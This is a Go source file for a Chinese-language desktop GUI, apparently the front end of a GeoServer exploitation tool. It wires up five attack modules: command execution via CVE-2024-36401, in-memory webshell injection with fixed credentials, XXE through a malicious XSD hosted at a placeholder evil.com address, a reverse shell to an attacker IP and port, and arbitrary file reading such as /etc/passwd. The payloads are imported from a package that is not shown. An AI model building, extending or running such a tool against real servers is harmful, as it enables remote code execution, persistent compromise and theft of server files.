package main

import (
	"fmt"
	"net/url"
	"regexp"
	"strings"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"

	"gui-exp/exploits"
)

var proxyURL *url.URL
var proxyLabel *widget.Label

// 漏洞描述
type ExploitModule struct {
	Name        string
	Description string
	Params      []string
}

var modules = map[string]ExploitModule{
	"rce": {
		Name:        "RCE - 命令执行(无回显)",
		Description: "CVE-2024-36401: 通过 WFS GetPropertyValue 执行任意命令\n\n**原理**: GeoServer 的 WFS 服务允许在 valueReference 参数中执行 ECQL 表达式，可利用 exec() 函数执行系统命令。\n\n**危害**: 可在目标服务器上执行任意系统命令。",
		Params:      []string{"目标 URL", "要执行的命令"},
	},
	"inject": {
		Name:        "内存马 - JS引擎注入",
		Description: "CVE-2024-36401: 通过 JS 引擎在内存中注入恶意类\n\n**原理**: 利用 GeoServer 的 ECQL 表达式引擎调用 JavaScript 引擎，加载恶意的 Base64 编码字节码。\n\n**危害**: 在目标内存中创建 Webshell，权限持久化。\n\n**配置**:\n- 加密器: JAVA_AES_BASE64\n- 密码: pass\n- 密钥: key",
		Params:      []string{"目标 URL"},
	},
	"xxe": {
		Name:        "XXE - XML 外部实体注入",
		Description: "CVE-2025-30220: 通过 XXE 漏洞读取敏感文件或进行 SSRF 攻击\n\n**原理**: WFS GetCapabilities 请求支持 xsi:schemaLocation，可指向恶意的 XSD 文件来触发 XXE。\n\n**危害**: 可读取任意文件、SSRF 攻击或 RCE。",
		Params:      []string{"目标 URL", "恶意 XSD 文件 URL"},
	},
	"revshell": {
		Name:        "反弹 Shell",
		Description: "CVE-2024-36401: 通过 RCE 建立反向连接的交互式 Shell\n\n**原理**: 基于 RCE 漏洞，执行反弹 shell 命令连接回攻击者。\n\n**危害**: 获得目标服务器的交互式命令行访问权。",
		Params:      []string{"目标 URL", "攻击机 IP", "攻击机端口"},
	},
	"filereading": {
		Name:        "文件读取 - XXE 漏洞",
		Description: "CVE-2025-58360：通过 WMS 请求中的 XXE 漏洞读取目标服务器上的文件\n\n**原理**: GeoServer 的 WMS 服务处理 StyledLayerDescriptor (SLD) 时，如果支持外部实体，可通过 XXE 注入读取任意文件。\n\n**危害**: 可读取服务器上的敏感文件，如 /etc/passwd、配置文件等。",
		Params:      []string{"目标 URL", "要读取的文件路径（如 /etc/passwd）"},
	},
}

// 格式化目标 URL
func formatTargetURL(input string) string {
	re := regexp.MustCompile(`^(http://|https://)?([0-9a-zA-Z\.-]+)(:[0-9]+)?(/.*)?$`)
	match := re.FindStringSubmatch(input)
	if match != nil {
		host := match[2]
		port := match[3]
		if !strings.HasPrefix(input, "http://") && !strings.HasPrefix(input, "https://") {
			return fmt.Sprintf("http://%s%s/geoserver/wfs", host, port)
		}
		return fmt.Sprintf("%s%s/geoserver/wfs", match[1], host+port)
	}
	return ""
}

// 执行漏洞利用
func executeExploit(moduleName string, targetURL string, params []string) (string, error) {
	// 规范化 URL，只保留协议和域名部分
	baseURL := exploits.NormalizeBaseURL(targetURL)

	switch moduleName {
	case "rce":
		if len(params) < 2 {
			return "", fmt.Errorf("缺少必要参数")
		}
		result, status, err := exploits.RCE(baseURL, params[1], proxyURL)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("状态: %s\n结果:\n%s", status, result), nil
	case "inject":
		result, status, err := exploits.Inject(baseURL, proxyURL)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("状态: %s\n配置: 加密器=JAVA_AES_BASE64, 密码=pass, 密钥=key\n结果:\n%s", status, result), nil
	case "xxe":
		if len(params) < 2 {
			return "", fmt.Errorf("缺少必要参数")
		}
		result, status, err := exploits.XXERequest(baseURL, params[1], proxyURL)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("状态: %s\n结果:\n%s", status, result), nil
	case "revshell":
		if len(params) < 3 {
			return "", fmt.Errorf("缺少必要参数")
		}
		result, status, err := exploits.ReverseShell(baseURL, params[1], params[2], proxyURL)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("状态: %s\n结果:\n%s", status, result), nil
	case "filereading":
		if len(params) < 2 {
			return "", fmt.Errorf("缺少必要参数")
		}
		result, status, err := exploits.FileReading(baseURL, params[1], proxyURL)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("状态: %s\n结果:\n%s", status, result), nil
	default:
		return "", fmt.Errorf("未知的模块")
	}
}

// 代理设置窗口
func proxySettingsWindow() {
	proxyWindow := fyne.CurrentApp().NewWindow("设置代理")

	proxyAddressEntry := widget.NewEntry()
	proxyAddressEntry.SetPlaceHolder("输入代理地址，例如：http://127.0.0.1:8080")

	resultLabel := widget.NewLabel("")

	saveButton := widget.NewButton("保存代理", func() {
		proxyAddress := proxyAddressEntry.Text
		if proxyAddress != "" {
			parsedURL, err := url.Parse(proxyAddress)
			if err != nil {
				resultLabel.SetText("❌ 代理设置失败：" + err.Error())
			} else {
				proxyURL = parsedURL
				proxyLabel.SetText("✓ 当前代理: " + proxyURL.String())
				resultLabel.SetText("✓ 代理已保存")
				proxyWindow.Close()
			}
		}
	})

	clearButton := widget.NewButton("清除代理", func() {
		proxyURL = nil
		proxyLabel.SetText("当前代理: 无")
		resultLabel.SetText("✓ 代理已清除")
		proxyWindow.Close()
	})

	content := container.NewVBox(
		widget.NewLabel("代理地址:"),
		proxyAddressEntry,
		container.NewHBox(saveButton, clearButton),
		resultLabel,
	)

	proxyWindow.SetContent(content)
	proxyWindow.Resize(fyne.NewSize(400, 200))
	proxyWindow.Show()
}

// 主函数 - 美化 GUI
func main() {
	myApp := app.NewWithID("GeoServer-Exploit")
	myWindow := myApp.NewWindow("GeoServer 综合漏洞利用平台")

	// 设置窗口初始大小，窗口会在屏幕中央打开，用户可自由调节
	myWindow.Resize(fyne.NewSize(1100, 750))
	myWindow.CenterOnScreen()

	// 标题
	titleText := canvas.NewText("GeoServer 漏洞利用工具", nil)
	titleText.TextSize = 24

	// 模块选择器
	selectedModule := "rce"
	moduleRadio := widget.NewRadioGroup(
		[]string{"RCE 命令执行", "内存马注入", "XXE 注入", "反弹 Shell", "文件读取"},
		func(value string) {
			switch value {
			case "RCE 命令执行":
				selectedModule = "rce"
			case "内存马注入":
				selectedModule = "inject"
			case "XXE 注入":
				selectedModule = "xxe"
			case "反弹 Shell":
				selectedModule = "revshell"
			case "文件读取":
				selectedModule = "filereading"
			}
		},
	)
	moduleRadio.SetSelected("RCE 命令执行")

	// 描述卡片
	descriptionLabel := widget.NewRichTextFromMarkdown(modules["rce"].Description)
	descriptionLabel.Wrapping = fyne.TextWrapWord
	descriptionScroll := container.NewScroll(descriptionLabel)
	descriptionScroll.SetMinSize(fyne.NewSize(400, 150))

	// 当选择改变时更新描述
	moduleRadio.OnChanged = func(value string) {
		switch value {
		case "RCE 命令执行":
			selectedModule = "rce"
		case "内存马注入":
			selectedModule = "inject"
		case "XXE 注入":
			selectedModule = "xxe"
		case "反弹 Shell":
			selectedModule = "revshell"
		}
		descriptionLabel.ParseMarkdown(modules[selectedModule].Description)
	}

	// 输入表单容器
	urlEntry := widget.NewEntry()
	urlEntry.SetPlaceHolder("http://127.0.0.1:8080 或 http://127.0.0.1:8080/geoserver/wfs")

	param2Entry := widget.NewEntry()
	param2Label := widget.NewLabel(modules["rce"].Params[1])
	param2Entry.SetPlaceHolder("例：touch /tmp/pwned")

	param3Entry := widget.NewEntry()
	param3Label := widget.NewLabel("")
	param3Container := container.NewVBox(param3Label, param3Entry)
	param3Container.Hide()

	// 执行按钮
	resultText := widget.NewMultiLineEntry()
	resultText.Wrapping = fyne.TextWrapWord
	resultScroll := container.NewScroll(resultText)
	resultScroll.SetMinSize(fyne.NewSize(500, 200))

	executeButton := widget.NewButton("执行漏洞验证", func() {
		targetURL := formatTargetURL(urlEntry.Text)
		if targetURL == "" {
			resultText.SetText("❌ 错误: URL 格式不正确")
			return
		}

		params := []string{targetURL}
		if param2Entry.Text != "" {
			params = append(params, param2Entry.Text)
		}
		if param3Entry.Text != "" {
			params = append(params, param3Entry.Text)
		}

		resultText.SetText("⏳ 正在执行...")
		go func() {
			result, err := executeExploit(selectedModule, targetURL, params)
			if err != nil {
				resultText.SetText("❌ 执行失败: " + err.Error())
			} else {
				resultText.SetText("✓ 执行完成\n\n" + result)
			}
		}()
	})

	// 代理按钮 - 放在顶部
	proxyLabel = widget.NewLabel("当前代理: 无")
	proxyButton := widget.NewButton("⚙️ 设置代理", proxySettingsWindow)
	proxyTopBar := container.NewHBox(proxyButton, proxyLabel)

	// 更新参数标签和容器的显示逻辑
	updateParamDisplay := func() {
		switch selectedModule {
		case "rce":
			param2Label.SetText(modules["rce"].Params[1])
			param2Entry.SetPlaceHolder("例：touch /tmp/pwned")
			param3Container.Hide()
		case "inject":
			param3Container.Hide()
		case "xxe":
			param2Label.SetText(modules["xxe"].Params[1])
			param2Entry.SetPlaceHolder("http://evil.com/poc.xsd")
			param3Container.Hide()
		case "revshell":
			param2Label.SetText(modules["revshell"].Params[1])
			param2Entry.SetPlaceHolder("127.0.0.1")
			param3Label.SetText(modules["revshell"].Params[2])
			param3Entry.SetPlaceHolder("4444")
			param3Container.Show()
		case "filereading":
			param2Label.SetText(modules["filereading"].Params[1])
			param2Entry.SetPlaceHolder("/etc/passwd")
			param3Container.Hide()
		}
	}

	// 覆盖 OnChanged 处理器
	moduleRadio.OnChanged = func(value string) {
		switch value {
		case "RCE 命令执行":
			selectedModule = "rce"
		case "内存马注入":
			selectedModule = "inject"
		case "XXE 注入":
			selectedModule = "xxe"
		case "反弹 Shell":
			selectedModule = "revshell"
		case "文件读取":
			selectedModule = "filereading"
		}
		descriptionLabel.ParseMarkdown(modules[selectedModule].Description)
		updateParamDisplay()
		// 清空输入框
		urlEntry.SetText("")
		param2Entry.SetText("")
		param3Entry.SetText("")
	}

	// 左侧面板 - 模块和参数
	leftPanel := container.NewVBox(
		widget.NewLabel("📋 选择漏洞模块:"),
		moduleRadio,
		widget.NewSeparator(),
		widget.NewLabel("📝 模块描述:"),
		descriptionScroll,
	)
	leftScroll := container.NewScroll(leftPanel)
	leftScroll.SetMinSize(fyne.NewSize(350, 450))

	// 右侧面板 - 输入和输出
	inputForm := container.NewVBox(
		widget.NewLabel("🎯 目标 URL:"),
		urlEntry,
		param2Label,
		param2Entry,
		param3Container,
		executeButton,
	)

	outputForm := container.NewVBox(
		widget.NewLabel("📊 执行结果:"),
		resultScroll,
	)

	rightPanel := container.NewVBox(inputForm, outputForm)
	rightScroll := container.NewScroll(rightPanel)
	rightScroll.SetMinSize(fyne.NewSize(600, 450))

	// 主布局
	mainContent := container.NewHBox(leftScroll, rightScroll)

	content := container.NewVBox(
		titleText,
		widget.NewSeparator(),
		proxyTopBar,
		widget.NewSeparator(),
		mainContent,
	)

	myWindow.SetContent(content)
	myWindow.ShowAndRun()
}
